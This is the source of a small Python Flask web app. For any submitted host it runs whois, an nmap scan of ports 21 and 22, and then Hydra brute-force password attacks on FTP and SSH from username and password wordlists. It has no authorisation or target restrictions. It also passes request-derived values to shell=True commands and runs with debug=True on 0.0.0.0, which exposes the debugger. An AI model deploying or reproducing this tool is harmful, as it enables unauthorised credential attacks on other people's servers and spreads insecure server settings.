from flask import Flask, render_template, request, jsonify
import subprocess
import re
import socket

app = Flask(__name__)

# Function to execute shell commands
def run_command(command):
    try:
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True)
        return result.stdout if result.returncode == 0 else result.stderr
    except Exception as e:
        return str(e)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/perform_scan', methods=['POST'])
def perform_scan():
    target = request.form['target']
    
    # Check if the target is a valid IP address or domain
    if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', target):
        ip = target
    else:
        try:
            ip = socket.gethostbyname(target)
        except socket.gaierror:
            return jsonify({'error': 'Failed to resolve domain to IP address.'}), 400

    # Perform WHOIS Lookup
    whois_result = run_command(f'whois {ip}')
    
    # Perform Port Scan on ports 21 (FTP) and 22 (SSH)
    port_scan_result = run_command(f'nmap -Pn -p21,22 {ip}')
    
    # Perform FTP and SSH Attacks using Hydra if ports are open
    ftp_attack_result = ''
    ssh_attack_result = ''
    
    if '21/tcp open' in port_scan_result:
        ftp_attack_result = run_command(f'hydra -L usernames.txt -P passwords.txt ftp://{ip} -t4 -o hydra_output_ftp.txt')
    else:
        ftp_attack_result = "Port 21 (FTP) is closed."

    if '22/tcp open' in port_scan_result:
        ssh_attack_result = run_command(f'hydra -L usernames.txt -P passwords.txt ssh://{ip} -t4 -o hydra_output_ssh.txt')
    else:
        ssh_attack_result = "Port 22 (SSH) is closed."

    # Return results as JSON
    return jsonify({
        'whois': whois_result,
        'port_scan': port_scan_result,
        'ftp_attack': ftp_attack_result,
        'ssh_attack': ssh_attack_result
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001, debug=True)
